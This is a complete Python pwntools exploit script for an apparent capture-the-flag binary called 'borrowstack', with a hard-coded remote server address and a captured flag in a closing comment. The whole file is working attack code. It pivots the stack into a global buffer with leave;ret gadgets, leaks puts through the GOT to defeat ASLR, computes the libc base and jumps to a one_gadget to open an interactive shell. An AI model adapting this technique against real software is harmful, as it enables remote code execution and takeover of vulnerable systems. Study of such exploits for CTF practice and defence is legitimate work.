#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./borrowstack')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('123.56.85.29', 3635)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./borrowstack', checksec=False)
got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
plt_read = elf.plt['read']
rop_leave_ret = 0x400699
rop_pop_rdi_ret = 0x400703
rop_pop_rsi_pop_r15_ret = 0x400701
addr_bank = 0x601080
addr_main = 0x400626

offset = 0x30
pd = 'a' * 0x60
pd += p64(addr_bank + offset)
pd += p64(rop_leave_ret)
p.sendafter('Ｗelcome to Stack bank,Tell me what you want\n', pd)

# gdb.attach(p, "b *0x400699\nc\nc\nc")
pd = 'a' * offset
pd += p64(addr_bank + 0x28 + offset)
pd += p64(rop_pop_rdi_ret)
pd += p64(got_puts)
pd += p64(plt_puts)

pd += p64(rop_leave_ret)
pd += p64(addr_bank + 0x40 + offset)
pd += p64(rop_leave_ret)
pd += p64(addr_bank + 0x58 + offset)
pd += p64(addr_bank + 0x98 + offset)

# 0x68
pd += p64(rop_pop_rdi_ret)
pd += p64(0)
pd += p64(rop_pop_rsi_pop_r15_ret)
pd += p64(addr_bank + 0xa0 + offset)
pd += p64(0)
pd += p64(plt_read)
pd += p64(rop_leave_ret)


p.sendafter('Done!You can check and use your borrow stack now!\n', pd)

addr_puts = u64(p.recv(6).ljust(8, '\x00'))
libcbase = addr_puts - libc.sym['puts']
libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
addr_system = libcbase + libc.sym['system']
addr_bin_sh = libcbase + libc.search('/bin/sh').next()
addr_one_gadget = libcbase + libc_one_gadget[1]

pd = p64(addr_one_gadget)
p.sendline(pd)
success('addr_puts   = ' + hex(addr_puts))
success('addr_system = ' + hex(addr_system))
success('addr_bin_sh = ' + hex(addr_bin_sh))
p.interactive()
# flag{7077b32679ba3c0326f962d753c9e2ae}
